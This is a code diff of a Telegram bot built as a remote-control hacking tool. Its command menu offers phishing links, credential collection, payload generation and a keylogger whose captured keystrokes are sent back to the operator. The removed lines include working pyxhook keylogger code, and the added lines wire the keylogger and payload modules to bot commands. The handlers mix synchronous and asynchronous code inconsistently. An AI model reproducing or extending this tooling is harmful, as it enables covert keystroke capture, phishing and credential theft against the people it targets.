@@ -15,23 +15,56 @@ import logging
 from telebot.async_telebot import AsyncTeleBot
 import aiohttp
 import gunicorn
+from config import BOT_TOKEN, YOUR_CHAT_ID, AUTHORIZED_USERS
+from keylogger import start_keylogger, stop_keylogger
+from payload import generate_payload
 
-LOG_FILE = "keylogs.txt"
-IMAGE_FILE = "puppy.jpg" 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-YOUR_CHAT_ID = os.environ.get("YOUR_CHAT_ID")
-API_ID = os.environ.get("API_ID")
-API_HASH = os.environ.get("API_HASH")
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
-PORT = int(os.environ.get("PORT", 5000))
-AUTHORIZED_USERS = {int(user_id) for user_id in os.environ.get("AUTHORIZED_USERS", "").split(",")}
+bot = telebot.TeleBot(BOT_TOKEN)
 
-bot = AsyncTeleBot(BOT_TOKEN)
-client = TelegramClient("session_name", API_ID, API_HASH)
-app = Flask(__name__)
+@bot.message_handler(commands=["start", "help"])
+def send_help(message):
+    help_text = (
+        "📖 *Available Commands:*\n\n"
+        "/start or /hello - Welcome message.\n"
+        "/phish - Sends a phishing link.\n"
+        "/credentials - Collects credentials.\n"
+        "/payload - Generates a secure payload file.\n"
+        "/startkeylogger - Starts the keylogger.\n"
+        "/stopkeylogger - Stops the keylogger.\n"
+        "/keylogs - Fetches keylogs.\n"
+        "/decryptlogs - Decrypts logs.\n"
+        "/help - Displays this help message."
+    )
+    bot.reply_to(message, help_text, parse_mode="Markdown")
 
-keylogger_thread = None
-_keylogger_active = threading.Event()
+@bot.message_handler(commands=["startkeylogger"])
+def start_keylogger_handler(message):
+    if message.chat.id in AUTHORIZED_USERS:
+        threading.Thread(target=start_keylogger, daemon=True).start()
+        bot.reply_to(message, "Keylogger started!")
+    else:
+        bot.reply_to(message, "⚠️ Unauthorized access.")
+
+@bot.message_handler(commands=["stopkeylogger"])
+def stop_keylogger_handler(message):
+    if message.chat.id in AUTHORIZED_USERS:
+        stop_keylogger()
+        bot.reply_to(message, "Keylogger stopped.")
+    else:
+        bot.reply_to(message, "⚠️ Unauthorized access.")
+
+@bot.message_handler(commands=["payload"])
+def send_payload(message):
+    if message.chat.id == YOUR_CHAT_ID:
+        success, result = generate_payload()
+        if success:
+            with open(result, "rb") as file:
+                bot.send_document(message.chat.id, file)
+        else:
+            bot.reply_to(message, f"❌ {result}")
+    else:
+        bot.reply_to(message, "⚠️ Unauthorized access.")
+
 
 # --- Logging Setup ---
 logging.basicConfig(
@@ -43,54 +76,6 @@ logging.basicConfig(
     ]
 )
 
-# --- Keylogger Functions ---
-def on_key_press(event):
-    """Logs keystrokes to a file."""
-    if not _keylogger_active.is_set():
-        return
-    try:
-        with open(LOG_FILE, "a") as logfile:
-            logfile.write(f"{event.Key}\n")
-    except Exception as e:
-        logging.error(f"Error logging key: {e}")
-
-def start_keylogger():
-    """Starts the keylogger."""
-    _keylogger_active.set()
-    hookman = pyxhook.HookManager()
-    hookman.KeyDown = on_key_press
-    hookman.HookKeyboard()
-    try:
-        hookman.start()
-    except KeyboardInterrupt:
-        hookman.cancel()
-
-def stop_keylogger():
-    """Stops the keylogger."""
-    _keylogger_active.clear()
-
-# 1. Welcome Handler
-@bot.message_handler(commands=["start", "hello"])
-def send_welcome(message):
-    bot.reply_to(message, "👋 H3ll0 H4CK3R! Type /phish to begin phishing simulation.")
-
-@bot.message_handler(commands=["help"])
-def send_help(message):
-    help_text = (
-        "📖 *Available Commands:*\n\n"
-        "/start or /hello - Welcome message to get started.\n"
-        "/phish - Sends a phishing link.\n"
-        "/credentials - Collects and displays username and password.\n"
-        "/payload - Generates and sends a secure payload file.\n"
-        "/target - Start phishing for a target group or username.\n"
-        "/startkeylogger - Starts the keylogger process.\n"
-        "/stopkeylogger - Stops the keylogger process.\n"
-        "/keylogs - Fetches and sends encrypted keylogs.\n"
-        "/decryptlogs - Decrypts and displays encrypted logs.\n"
-        "/help - Displays this help message.\n\n"
-        "⚠️ *Note:* Use responsibly and only for educational purposes."
-    )
-    bot.reply_to(message, help_text, parse_mode="Markdown")
 
 # 3. Send Phishing Link
 @bot.message_handler(commands=['phish'])
@@ -196,29 +181,6 @@ def log_responses(message):
     except Exception as e:
         bot.reply_to(message, f"⚠️ Error logging response: {e}")
 
-@bot.message_handler(commands=["startkeylogger"])
-async def start_keylogger_handler(message):
-    if message.chat.id not in AUTHORIZED_USERS:
-        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
-        return
-
-    global keylogger_thread
-    if keylogger_thread is None or not keylogger_thread.is_alive():
-        await bot.reply_to(message, "Starting the keylogger...")
-        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
-        keylogger_thread.start()
-        await bot.reply_to(message, "Keylogger started!")
-    else:
-        await bot.reply_to(message, "Keylogger is already running.")
-
-@bot.message_handler(commands=["stopkeylogger"])
-async def stop_keylogger_handler(message):
-    if message.chat.id not in AUTHORIZED_USERS:
-        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
-        return
-
-    stop_keylogger()
-    await bot.reply_to(message, "Keylogger stopped.")
 
 @bot.message_handler(commands=["keylogs"])
 async def fetch_keylogs_handler(message):
@@ -239,33 +201,3 @@ async def fetch_keylogs_handler(message):
         logging.error(f"Error fetching keylogs: {e}")
         await bot.reply_to(message, "An error occurred while fetching keylogs.")
 
-
-# --- Flask Webhook ---
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def receive_update():
-    json_update = request.get_json()
-    asyncio.run(bot.process_new_updates([telebot.types.Update.de_json(json_update)]))
-    return "OK", 200
-
-@app.route("/")
-def home():
-    return "Bot is running!"
-
-async def setup_webhook():
-    """Remove any existing webhook and set a new one."""
-    await bot.remove_webhook()
-    await bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")
-
-asyncio.run(setup_webhook())
-
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-async def webhook():
-    """Process incoming updates from Telegram."""
-    if request.data:
-        update = request.get_data().decode("utf-8")
-        await bot.process_new_updates([update])
-    return "OK", 200
-
-if __name__ == "__main__":
-    from gunicorn.app.wsgiapp import run
-    app.run(host='0.0.0.0', port=PORT)  # Directly run the app with Flask if not using Gunicorn
